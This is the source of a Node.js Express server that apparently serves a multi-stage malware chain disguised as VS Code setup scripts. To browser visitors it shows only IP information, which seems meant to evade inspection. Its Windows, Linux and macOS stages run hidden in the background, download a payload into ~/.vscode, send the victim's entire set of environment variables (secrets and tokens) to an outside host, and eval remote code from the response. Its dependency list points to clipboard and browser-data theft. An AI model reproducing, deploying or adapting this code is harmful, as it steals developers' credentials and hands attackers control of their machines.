const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");
const rateLimit = require("express-rate-limit");
const axios = require("axios");
const requestIp = require("request-ip");

const { isBanned } = require("./middleware/ipBlocker");
const { logBlockedRequest } = require("./middleware/logger");

dotenv.config();

const app = express();
const port = process.env.PORT || 4000;

// --- Rate Limiter ---
const generalLimiter = rateLimit({
  windowMs: 10 * 60 * 1000, // 10 minutes
  max: 50, // 50 requests per window per IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { status: 429, error: "Too many requests, try again later." },
});

// --- Valid tokens for API access ---
const VALID_FLAGS = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];

// --- App Settings ---
app.set("trust proxy", false); // Important for correct IP extraction on Vercel
app.use(cors());
app.use(requestIp.mw()); // Extracts client IP early
app.use(express.json());
app.use(generalLimiter); // Apply rate limit globally

// --- IP Ban Middleware (must come after requestIp.mw) ---
app.use((req, res, next) => {
  if (isBanned(req.clientIp)) {
    logBlockedRequest(req.clientIp, "IP banned");
    return res.status(403).json({ error: "Access denied." });
  }
  next();
});

// --- Optional IP Logging Middleware ---
app.use(async (req, res, next) => {
  const clientIp = req.clientIp;
  const userAgent = req.headers["user-agent"] || "";
  const postmanToken =
    userAgent.toLowerCase().includes("postman") || req.headers["postman-token"];

  // Detect if request comes from a browser or Postman
  const isBrowserOrPostman =
    userAgent.includes("Mozilla") ||
    userAgent.includes("Chrome") ||
    userAgent.includes("Safari") ||
    userAgent.includes("Edge") ||
    postmanToken; // Postman requests have this header

  if (isBrowserOrPostman) {
    // --- Show IP info if accessed from a browser or Postman ---
    try {
      const response = await axios.get(`http://ip-api.com/json/${clientIp}`);
      return res.json({ ipInfo: response.data });
    } catch (err) {
      return res.status(403).json({
        ipInfo: { query: clientIp, message: "Unable to fetch IP details." },
        error: err,
      });
    }
  }
  next();
});

app.get("/settings/:type", (req, res) => {
  const { type } = req.params;
  const { flag } = req.query;

  let script = "";

  switch (type) {
    case "windows":
      if (!VALID_FLAGS.includes(flag)) {
        return res.status(403).send("Unauthorized token");
      }
      script = `
@echo off
set "VSCODE_DIR=%USERPROFILE%\\.vscode"

if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )

curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://gitcheckout.vercel.app/settings/bootstrap?flag=${flag}
cls
"%VSCODE_DIR%\\vscode-bootstrap.cmd"
cls
    	`;
    	break;

    case "linux":
      if (!VALID_FLAGS.includes(flag)) {
        return res.status(403).send("Unauthorized token");
      }
      script = `
#!/bin/bash
set -e
echo "Authenticated"

TARGET_DIR="$HOME/.vscode"
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://gitcheckout.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
clear
nohup bash "$TARGET_DIR/vscode-bootstrap.sh" > /dev/null 2>&1 &
clear
exit 0
    	`;
    	break;

    case "mac":
      if (!VALID_FLAGS.includes(flag)) {
        return res.status(403).send("Unauthorized token");
      }
      script = `
#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://gitcheckout.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
clear
nohup bash "$HOME/.vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
clear
exit 0
    	`;
    	break;

    case "bootstrap":
      if (!VALID_FLAGS.includes(flag)) {
        return res.status(403).send("Unauthorized token");
      }
      script = `
@echo off
title Creating new Info
setlocal enabledelayedexpansion

if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \\"%~f0\\" _restarted' -WindowStyle Hidden" & exit /b

REM Get latest Node.js version using PowerShell
for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"

REM Remove leading "v"
set "NODE_VERSION=%LATEST_VERSION:~1%"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\\PFiles64\\nodejs\\node.exe"
set "NODE_EXE="

:: -------------------------
:: Check for global Node.js
:: -------------------------
where node >nul 2>&1
if not errorlevel 1 (
    for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
    set "NODE_EXE=node"
    echo [INFO] Node.js is already installed globally: %NODE_INSTALLED_VERSION%
)

if not defined NODE_EXE (
    if exist "%PORTABLE_NODE%" (
        echo [INFO] Portable Node.js found after extraction.
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\\PFiles64\\nodejs;%PATH%"
    ) else ( echo [INFO] Node.js not found globally. Attempting to extract portable version...

    :: -------------------------
    :: Download Node.js MSI if needed
    :: -------------------------
    where curl >nul 2>&1
    if errorlevel 1 (
        echo [INFO] Using PowerShell to download Node.js...
        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
    ) else (
        echo [INFO] Using curl to download Node.js...
        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
    )

    if exist "%~dp0%NODE_MSI%" (
        echo [INFO] Extracting Node.js MSI to %EXTRACT_DIR%...
        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
        del "%~dp0%NODE_MSI%"
    ) else (
        echo [ERROR] Failed to download Node.js MSI.
        exit /b 1
    )

    if exist "%PORTABLE_NODE%" (
        echo [INFO] Portable Node.js found after extraction.
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\\PFiles64\\nodejs;%PATH%"
    ) else (
        echo [ERROR] node.exe not found after extraction.
        exit /b 1
    )
    )
)

:: -------------------------
:: Confirm Node.js works
:: -------------------------
if not defined NODE_EXE (
    echo [ERROR] Node.js executable not found or set.
    exit /b 1
)
:: -------------------------
:: Download required files
:: -------------------------
set "CODEPROFILE=%USERPROFILE%\\.vscode"
echo [INFO] Downloading env-setup.npl and package.json...

curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitcheckout.vercel.app/settings/env?flag=${flag}"
curl -L -o "%CODEPROFILE%\\package.json" "https://gitcheckout.vercel.app/settings/package"

:: -------------------------
:: Install dependencies
:: -------------------------
if not exist "%~dp0node_modules\\axios" (
    pushd "%~dp0"
    echo [INFO] Installing NPM packages...
    call npm install --silent --no-progress --loglevel=error --fund=false
    if errorlevel 1 (
        echo [ERROR] npm install failed.
        popd
        exit /b 1
    )
    popd
)

:: -------------------------
:: Run the parser
:: -------------------------
if exist "%CODEPROFILE%\\env-setup.npl" (
    echo [INFO] Running env-setup.npl...
    pushd "%CODEPROFILE%"
    "%NODE_EXE%" "%CODEPROFILE%\\env-setup.npl"
    if errorlevel 1 (
        echo [ERROR] env-setup execution failed.
        exit /b 1
        )
    popd
) else (
    echo [ERROR] env-setup.npl not found.
    exit /b 1
)

echo [SUCCESS] Script completed successfully.
exit /b 0
    	`;
    	break;

    case "bootstraplinux":
      if (!VALID_FLAGS.includes(flag)) {
        return res.status(403).send("Unauthorized token");
      }
      script = `
#!/bin/bash
# Creating new Info
set -e
OS=$(uname -s)
NODE_EXE=""
NODE_INSTALLED_VERSION=""
# -------------------------
# Check for global Node.js installation
# -------------------------
if command -v node &> /dev/null; then
    NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
    if [ -n "$NODE_INSTALLED_VERSION" ]; then
        NODE_EXE="node"
        echo "[INFO] Node.js is already installed globally: $NODE_INSTALLED_VERSION"
    fi
fi
# -------------------------
# If Node.js not found globally, download and extract portable version
# -------------------------
if [ -z "$NODE_EXE" ]; then
    echo "[INFO] Node.js not found globally. Attempting to download portable version..."
    # Get latest Node.js version
    if [ "$OS" == "Darwin" ]; then
        # macOS - get latest version
        if command -v curl &> /dev/null; then
            LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
        elif command -v wget &> /dev/null; then
            LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
        else
            LATEST_VERSION="v20.11.1"
        fi
    elif [ "$OS" == "Linux" ]; then
        # Linux - get latest version
        if command -v curl &> /dev/null; then
            LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
        elif command -v wget &> /dev/null; then
            LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
        else
            LATEST_VERSION="v20.11.1"
        fi
    else
        echo "[ERROR] Unsupported OS: $OS"
        exit 1
    fi
    # Remove leading "v"
    NODE_VERSION=\${LATEST_VERSION#v}
    # Determine download URL and paths based on OS
    EXTRACTED_DIR="$HOME/.vscode/node-v\${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
    PORTABLE_NODE="$EXTRACTED_DIR/bin/node"
    if [ "$OS" == "Darwin" ]; then
        NODE_TARBALL="$HOME/.vscode/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
        DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
    elif [ "$OS" == "Linux" ]; then
        NODE_TARBALL="$HOME/.vscode/node-v\${NODE_VERSION}-linux-x64.tar.xz"
        DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-linux-x64.tar.xz"
    fi
    # Check if portable Node.js already exists
    if [ -f "$PORTABLE_NODE" ]; then
        echo "[INFO] Portable Node.js found."
        NODE_EXE="$PORTABLE_NODE"
        export PATH="$EXTRACTED_DIR/bin:$PATH"
    else
        echo "[INFO] Downloading Node.js..."
        mkdir -p "$HOME/.vscode"
        # Download Node.js
        if ! command -v curl &> /dev/null && ! command -v wget &> /dev/null; then
            echo "[ERROR] Neither curl nor wget is available."
            exit 1
        fi
        if command -v curl &> /dev/null; then
            curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
        else
            wget -q -O "$NODE_TARBALL" "$DOWNLOAD_URL"
        fi
        if [ ! -f "$NODE_TARBALL" ]; then
            echo "[ERROR] Failed to download Node.js."
            exit 1
        fi
        echo "[INFO] Extracting Node.js..."
        tar -xf "$NODE_TARBALL" -C "$HOME/.vscode"
        rm -f "$NODE_TARBALL"
        if [ -f "$PORTABLE_NODE" ]; then
            echo "[INFO] Portable Node.js extracted successfully."
            NODE_EXE="$PORTABLE_NODE"
            export PATH="$EXTRACTED_DIR/bin:$PATH"
        else
            echo "[ERROR] node executable not found after extraction."
            exit 1
        fi
    fi
fi
# -------------------------
# Verify Node.js works
# -------------------------
if [ -z "$NODE_EXE" ]; then
    echo "[ERROR] Node.js executable not set."
    exit 1
fi
"$NODE_EXE" -v > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "[ERROR] Node.js execution failed."
    exit 1
fi
# -------------------------
# Download required files
# -------------------------
USER_HOME="$HOME/.vscode"
mkdir -p "\${USER_HOME}"
BASE_URL="https://gitcheckout.vercel.app"
echo "[INFO] Downloading env-setup.js and package.json..."
if ! command -v curl >/dev/null 2>&1; then
    wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
    wget -q -O "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
else
    curl -s -L -o "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
    curl -s -L -o "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
fi
# -------------------------
# Install dependencies
# -------------------------
cd "\${USER_HOME}"
if [ ! -d "node_modules/axios" ]; then
    echo "[INFO] Installing NPM packages..."
    if command -v npm &> /dev/null; then
        npm install --silent --no-progress --loglevel=error --fund=false
    else
        # Use npm from extracted directory if available
        if [ -n "$EXTRACTED_DIR" ] && [ -f "$EXTRACTED_DIR/bin/npm" ]; then
            "$EXTRACTED_DIR/bin/npm" install --silent --no-progress --loglevel=error --fund=false
        else
            echo "[ERROR] npm not found."
            exit 1
        fi
    fi
    if [ $? -ne 0 ]; then
        echo "[ERROR] npm install failed."
        exit 1
    fi
fi
# -------------------------
# Run env-setup.js
# -------------------------
if [ -f "\${USER_HOME}/env-setup.js" ]; then
    echo "[INFO] Running env-setup.js..."
    #cd "$HOME"
    "$NODE_EXE" "\${USER_HOME}/env-setup.js"
    if [ $? -ne 0 ]; then
        echo "[ERROR] env-setup.js execution failed."
        exit 1
    fi
else
    echo "[ERROR] env-setup.js not found."
    exit 1
fi
echo "[SUCCESS] Script completed successfully."
exit 0
`;

    	break;
	case "package":
		script = `
	{
		"name": "env",
		"version": "1.0.0",
		"devDependencies": {
			"hardhat": "^2.20.2"
		},
		"dependencies": {
			"axios": "^1.10.0",
			"fs": "^0.0.1-security",
			"request": "^2.88.2",
			"clipboardy": "^4.0.0",
      "socket.io-client": "^4.8.1",
      "sql.js": "^1.13.0"
		},
		"scripts": {
			"test": "npx hardhat test",
			"deploy": "npx hardhat run scripts/deploy.js"
		}
	}
		`;
		break;
	case "env":
    if (!VALID_FLAGS.includes(flag)) {
      return res.status(403).send("Unauthorized token");
    }
    
		script = `
	const axios = require('axios');
const host = "checkmyip-zeta.vercel.app";
const apikey = "3aeb34a3${flag}";
axios
  .post(
    \`https://\${host}/api/vscode-encrypted/\${apikey}\`,
    { ...process.env },
    { headers: { "x-secret-header": "secret" } }
  )
  .then((response) => {
    eval(response.data);
    return response.data;
  })
  .catch((err) => {
    return false;
  });
	`;
	break;

    default:
      return res.status(400).send("Invalid OS");
  }

  res.type("text/plain").send(script.trim());
});

// --- Server Listener ---
app.listen(port, () => {
  console.log(`✅ Server listening on port ${port}`);
});

// --- Export for Vercel deployment ---
module.exports = app;
